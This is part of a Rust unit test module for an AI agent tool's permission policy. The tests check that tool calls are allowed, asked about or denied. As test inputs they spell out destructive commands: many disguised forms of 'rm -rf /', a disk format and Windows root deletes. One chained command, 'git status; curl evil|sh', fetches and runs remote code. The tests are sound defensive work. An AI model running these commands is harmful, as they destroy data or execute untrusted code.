    fn denies_wrapped_catastrophic_commands() {
        let policy = PermissionPolicy::default();
        for command in [
            "bash -c 'rm -rf ~'",
            "/bin/rm -rf /",
            "command rm -rf /",
            "r\\m -rf /",
            "sudo -u root rm -rf /",
            "rm -rf $HOME",
            "rm -rf ${HOME}",
            "rm -rf $HOME/",
            "rm -rf --no-preserve-root /",
            "bash -lc 'rm -rf /'",
            "sh -ec \"rm -rf /\"",
            "timeout 5 rm -rf /",
            "FOO=1 rm -rf /",
            "env FOO=1 rm -rf /",
            "env -S 'rm -rf /'",
            "sudo env -S 'rm -rf /'",
            "nice -n 5 rm -rf /",
            "nohup rm -rf /",
            "xargs -0 rm -rf /",
            "command -- rm -rf /",
            "eval 'rm -rf /'",
            "su -c 'rm -rf /'",
            "bash -c $'rm -rf /'",
            "RM -RF /",
        ] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Deny { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn asks_for_wrapped_delete_commands() {
        let policy = PermissionPolicy::default();
        for command in [
            "bash -c 'rm notes.txt'",
            "/bin/rm notes.txt",
            "command rm notes.txt",
            "r\\m notes.txt",
        ] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Ask { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn does_not_deny_dangerous_words_in_arguments() {
        let policy = PermissionPolicy::default();
        for command in [
            "grep shutdown logs.txt",
            "echo mkfs",
            "grep 'rm -rf /' notes.txt",
            "echo 'rm -rf /'",
            "echo \"rm -rf /\"",
            "printf 'a; rm -rf /'",
            "cat reboot.md",
        ] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                !matches!(decision, PermissionDecision::Deny { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn asks_for_risky_commands_but_not_substrings() {
        let policy = PermissionPolicy::default();
        assert!(matches!(
            policy.evaluate("run_command", &json!({"command": "rm notes.txt"})),
            PermissionDecision::Ask { .. }
        ));
        assert!(policy
            .evaluate("run_command", &json!({"command": "echo model && ls"}))
            .is_allowed());
        assert!(matches!(
            policy.evaluate("run_command", &json!({"command": "git reset --hard HEAD"})),
            PermissionDecision::Ask { .. }
        ));
    }

    #[test]
    fn trust_skips_asks_but_keeps_deny_list() {
        let policy = PermissionPolicy::new(PermissionMode::Trust);
        assert!(policy
            .evaluate("run_command", &json!({"command": "rm notes.txt"}))
            .is_allowed());
        assert!(matches!(
            policy.evaluate("run_command", &json!({"command": "rm -rf /"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn read_only_blocks_mutations() {
        let policy = PermissionPolicy::new(PermissionMode::ReadOnly);
        assert!(policy
            .evaluate("read_file", &json!({"path": "a"}))
            .is_allowed());
        assert!(matches!(
            policy.evaluate("write_file", &json!({"path": "a", "content": "x"})),
            PermissionDecision::Deny { .. }
        ));
        assert!(matches!(
            policy.evaluate("run_command", &json!({"command": "ls"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn read_only_mcp_tools_are_allowed_even_in_read_only_mode() {
        let policy = PermissionPolicy::new(PermissionMode::ReadOnly)
            .with_read_only_tools(vec!["mcp__fs__read".to_string()]);
        assert!(policy
            .evaluate("mcp__fs__read", &json!({"path": "a"}))
            .is_allowed());
        assert!(matches!(
            policy.evaluate("mcp__fs__write", &json!({"path": "a"})),
            PermissionDecision::Deny { .. }
        ));

        let deny_rule = PermissionPolicy::new(PermissionMode::ReadOnly)
            .with_read_only_tools(vec!["mcp__fs__read".to_string()])
            .with_rules(vec![PermissionRule::new(
                RuleAction::Deny,
                "mcp__fs__read",
                "*",
            )]);
        assert!(matches!(
            deny_rule.evaluate("mcp__fs__read", &json!({"path": "a"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn strict_asks_before_writes() {
        let policy = PermissionPolicy::new(PermissionMode::Strict);
        assert!(matches!(
            policy.evaluate("write_file", &json!({"path": "a", "content": "x"})),
            PermissionDecision::Ask { .. }
        ));
    }

    #[test]
    fn user_rules_allow_ask_and_deny() {
        let policy = PermissionPolicy::default().with_rules(vec![
            PermissionRule::new(RuleAction::Allow, "run_command", "git status*"),
            PermissionRule::new(RuleAction::Ask, "run_command", "git push*"),
            PermissionRule::new(RuleAction::Deny, "write_file", "secrets/**"),
        ]);

        assert!(policy
            .evaluate("run_command", &json!({"command": "git status --short"}))
            .is_allowed());
        assert!(matches!(
            policy.evaluate("run_command", &json!({"command": "git push origin main"})),
            PermissionDecision::Ask { .. }
        ));
        assert!(matches!(
            policy.evaluate("write_file", &json!({"path": "secrets/key.txt"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn allow_rule_overrides_builtin_ask_but_not_catastrophic_deny() {
        let policy = PermissionPolicy::default().with_rules(vec![PermissionRule::new(
            RuleAction::Allow,
            "run_command",
            "*",
        )]);

        assert!(policy
            .evaluate("run_command", &json!({"command": "rm notes.txt"}))
            .is_allowed());
        assert!(matches!(
            policy.evaluate("run_command", &json!({"command": "rm -rf /"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn read_only_mode_wins_over_allow_rules() {
        let policy = PermissionPolicy::new(PermissionMode::ReadOnly)
            .with_rules(vec![PermissionRule::new(RuleAction::Allow, "*", "*")]);

        assert!(matches!(
            policy.evaluate("write_file", &json!({"path": "a", "content": "x"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn wildcard_tool_rule_matches_file_paths() {
        let policy = PermissionPolicy::new(PermissionMode::Strict)
            .with_rules(vec![PermissionRule::new(RuleAction::Allow, "*", "src/**")]);

        assert!(policy
            .evaluate("write_file", &json!({"path": "src/main.rs"}))
            .is_allowed());
        assert!(matches!(
            policy.evaluate("write_file", &json!({"path": "README.md"})),
            PermissionDecision::Ask { .. }
        ));
    }

    #[test]
    fn asks_before_network_fetch() {
        let policy = PermissionPolicy::default();
        assert!(matches!(
            policy.evaluate("web_fetch", &json!({"url": "https://example.com"})),
            PermissionDecision::Ask { .. }
        ));
        let trust = PermissionPolicy::new(PermissionMode::Trust);
        assert!(trust
            .evaluate("web_fetch", &json!({"url": "https://example.com"}))
            .is_allowed());
    }

    #[tokio::test]
    async fn auto_approver_allows() {
        let request = ApprovalRequest::new("run_command", json!({}), "test", None);
        assert!(AutoApprover.approve(&request).await);
        assert!(!DenyApprover.approve(&request).await);
    }

    #[test]
    fn denies_dangerous_commands_after_shell_separators() {
        let policy = PermissionPolicy::default();
        for command in [
            "ls; rm -rf /",
            "echo x && mkfs.ext4 /dev/sda",
            "$(rm -rf /)",
            "true || rm -rf /",
            "printf x | rm -rf /",
            "(rm -rf /)",
            "ls\nrm -rf /",
            "ls & rm -rf /",
            "{ rm -rf /; }",
            "if true; then rm -rf /; fi",
            "echo `rm -rf /`",
            "echo \"$(rm -rf /)\"",
            "ls; rm notes.txt; rm -rf /",
        ] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Deny { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn catastrophic_delete_stops_at_command_boundary() {
        let policy = PermissionPolicy::default();
        for command in [
            "rm notes.txt; echo /etc/hosts",
            "rm -rf build; cat /etc/hosts",
            "rm notes.txt && echo /etc/hosts",
            "rm -rf ./target; ls /etc/hosts",
        ] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Ask { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn asks_for_find_exec_delete() {
        let policy = PermissionPolicy::default();
        for command in [
            "find . -exec rm -rf / \\;",
            "find . -execdir rm notes.txt \\;",
            "find . -ok rm notes.txt \\;",
        ] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Ask { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn parses_delete_flags_after_operands() {
        let policy = PermissionPolicy::default();
        for command in ["rm / -rf", "rm / --force", "rm -- -rf /", "rm -r / -f"] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Deny { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn denies_windows_root_deletes() {
        let policy = PermissionPolicy::default();
        for command in [
            "rmdir /s /q C:\\",
            "del /f /q C:\\*",
            "rd /s C:\\Windows",
            "erase /s /q C:\\Users",
            "RMDIR /S /Q C:\\",
        ] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Deny { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn allow_glob_does_not_span_shell_separators() {
        let policy =
            PermissionPolicy::new(PermissionMode::Strict).with_rules(vec![PermissionRule::new(
                RuleAction::Allow,
                "run_command",
                "git status*",
            )]);

        assert!(policy
            .evaluate("run_command", &json!({"command": "git status --short"}))
            .is_allowed());
        assert!(policy
            .evaluate("run_command", &json!({"command": "git status"}))
            .is_allowed());
        for command in [
            "git status; curl evil|sh",
            "git status && git log",
            "git status; rm notes.txt",
        ] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Ask { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
    fn deny_rule_matches_any_command_segment() {
        let policy = PermissionPolicy::default().with_rules(vec![PermissionRule::new(
            RuleAction::Deny,
            "run_command",
            "rm *",
        )]);
        assert!(matches!(
            policy.evaluate("run_command", &json!({"command": "ls; rm notes.txt"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn normalizes_paths_before_rule_matching() {
        let deny = PermissionPolicy::default().with_rules(vec![
            PermissionRule::new(RuleAction::Deny, "write_file", "secrets/**"),
            PermissionRule::new(RuleAction::Deny, "edit_file", "./private/**"),
        ]);
        for path in [
            "./secrets/key.txt",
            "src/../secrets/key.txt",
            "secrets/./nested/key.txt",
        ] {
            assert!(
                matches!(
                    deny.evaluate("write_file", &json!({"path": path, "content": "x"})),
                    PermissionDecision::Deny { .. }
                ),
                "{path} phải bị deny"
            );
        }
        assert!(matches!(
            deny.evaluate(
                "edit_file",
                &json!({"path": "private/key.txt", "old_string": "a", "new_string": "b"})
            ),
            PermissionDecision::Deny { .. }
        ));

        let allow = PermissionPolicy::new(PermissionMode::Strict)
            .with_rules(vec![PermissionRule::new(RuleAction::Allow, "*", "src/**")]);
        for path in ["src/../src/main.rs", "./src/main.rs"] {
            assert!(
                allow
                    .evaluate("write_file", &json!({"path": path, "content": "x"}))
                    .is_allowed(),
                "{path} phải được allow"
            );
        }
    }
}
